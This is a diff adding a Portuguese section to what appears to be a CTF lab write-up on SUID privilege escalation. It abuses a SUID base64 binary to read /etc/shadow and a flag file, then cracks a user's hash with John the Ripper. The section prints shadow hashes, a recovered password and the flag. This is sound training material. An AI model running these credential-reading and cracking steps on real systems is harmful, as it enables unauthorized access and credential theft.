@@ -446,3 +446,131 @@ frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelW
 2. Pesquisa: Consulta ao GTFOBins para métodos de exploração
 3. Execução: Uso dos parâmetros adequados para spawnar shell root
 4. Coleta: Acesso a arquivos sensíveis e flags
+
+---
+## 5. SUID
+
+### Compreensão do SUID
+
+O SUID (Set User ID) é uma permissão especial em sistemas Unix/Linux que permite que um executável seja executado com os privilégios do proprietário do arquivo, em vez dos privilégios do usuário que o executa. Quando configurado em binários, o SUID pode representar um vetor de escalonamento de privilégios se o proprietário for root e o binário tiver vulnerabilidades ou funcionalidades que possam ser exploradas.
+
+O bit SUID é representado por um `s` na posição de permissão de execução do proprietário:
+
+```text
+-rwsr-xr-x    → SUID ativo (executa como proprietário)
+```
+
+### Identificação de Binários SUID
+
+Para encontrar todos os binários com bit SUID ativo no sistema, utiliza-se o comando:
+
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+**Explicação do comando:**
+
+- `find /`: Procura a partir do diretório raiz
+- `-type f`: Busca apenas arquivos regulares
+- `-perm -04000`: Filtra arquivos com permissão SUID (octal 4000)
+- `-ls`: Exibe em formato detalhado
+- `2>/dev/null`: Redireciona erros para /dev/null (silencia "Permission denied")
+
+### Caso Prático: Exploração do `base64`
+
+#### Identificação do Binário Vulnerável
+
+Na saída do comando anterior, encontramos:
+
+```text
+44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
+```
+
+**Análise:**
+
+- `-rwsr-xr-x`: O `s` na posição do proprietário indica SUID ativo
+- `root root`: O arquivo pertence ao usuário root e grupo root
+- `/usr/bin/base64`: Binário que pode ser executado por qualquer usuário com privilégios de root
+
+#### Exploração via GTFOBins
+
+Consultando o [GTFOBins para base64](https://gtfobins.github.io/gtfobins/base64/), encontramos que o comando `base64` pode ser usado para ler arquivos arbitrários:
+
+```bash
+# Método documentado no GTFOBins
+base64 /path/to/input-file | base64 --decode
+```
+
+#### Leitura do Arquivo /etc/shadow
+
+Aplicando esta técnica para ler o arquivo `/etc/shadow` (que normalmente só é acessível pelo root):
+
+```bash
+base64 /etc/shadow | base64 --decode
+```
+
+**Funcionamento:**
+
+1. `base64 /etc/shadow`: Lê o arquivo /etc/shadow (com privilégios de root devido ao SUID) e codifica seu conteúdo em base64
+2. `|`: Pipe que envia a saída para o próximo comando
+3. `base64 --decode`: Decodifica o conteúdo base64 de volta para texto legível
+
+**Saída relevante para o usuário user2:**
+
+```text
+user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
+```
+
+#### Quebra da Senha com John The Ripper
+
+**1. Preparação do hash:**
+
+```bash
+echo 'user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/' > hash.txt
+```
+
+**2. Execução do John the Ripper:**
+
+```bash
+john --format=crypt --wordlist=rockyou.txt hash.txt
+```
+
+**Explicação dos parâmetros:**
+
+- `--format=crypt`: Especifica o formato do hash (crypt para hashes Unix)
+- `--wordlist=rockyou.txt`: Usa a wordlist rockyou.txt para ataque de dicionário
+- `hash.txt`: Arquivo contendo o hash
+
+**3. Resultado:**
+
+```text
+user2:Password1
+```
+
+A senha do usuário user2 é: **Password1**
+
+### Captura da Flag 3
+
+Utilizando a mesma técnica para ler a flag que está em um diretório restrito:
+
+```bash
+base64 /home/ubuntu/flag3.txt | base64 --decode
+```
+
+**Resultado:**
+
+```text
+THM-3847834
+```
+
+### Resumo da Exploração
+
+1. **Enumeração:** Encontrar binários SUID com `find / -type f -perm -04000 -ls 2>/dev/null`
+2. **Identificação:** Localizar `/usr/bin/base64` com SUID root
+3. **Pesquisa:** Consultar GTFOBins para métodos de exploração do base64
+4. **Exploração:** Usar `base64` para ler arquivos restritos (`/etc/shadow`, `/home/ubuntu/flag3.txt`)
+5. **Pós-exploração:** Quebrar hash de senha com John the Ripper
+6. **Conclusão:** Obter credenciais (user2:Password1) e flag (THM-3847834)
+
+Esta exploração demonstra como binários SUID mal configurados podem ser usados para leitura arbitrária de arquivos, incluindo arquivos sensíveis do sistema e flags de desafio.
+
